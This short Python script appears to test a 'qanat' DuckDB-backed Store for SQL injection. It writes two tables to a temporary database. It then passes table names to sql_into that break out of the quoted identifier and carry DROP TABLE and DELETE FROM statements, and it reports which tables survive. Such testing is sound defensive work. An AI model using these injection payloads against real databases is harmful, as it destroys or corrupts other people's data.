import tempfile, pathlib
import pandas as pd
from qanat.store import Store

tmp = pathlib.Path(tempfile.mkdtemp())
s = Store(tmp / "t.duckdb")
s.write("raw.keepme", pd.DataFrame({"a": [1, 2, 3]}))
s.write("raw.alsokeep", pd.DataFrame({"a": [1]}))
print("before:", s.all_tables())

payloads = [
    'raw.x" AS SELECT 1; DROP TABLE "main"."raw__keepme"; CREATE OR REPLACE TABLE "main"."raw__pwned',
    'raw.x" AS SELECT 1 AS z; DELETE FROM "main"."raw__alsokeep"; CREATE OR REPLACE TABLE "main"."raw__pwned2',
]
for p in payloads:
    try:
        s.sql_into(p, "SELECT 1 AS z")
        print("OK  ->", p[:60])
    except Exception as exc:
        print("ERR ->", type(exc).__name__, str(exc).splitlines()[0][:120])
    print("   tables now:", s.all_tables())
    print("   keepme:", s.exists("raw.keepme"), " alsokeep rows:",
          s.query('SELECT count(*) c FROM "raw__alsokeep"')["c"][0] if s.exists("raw.alsokeep") else "gone")
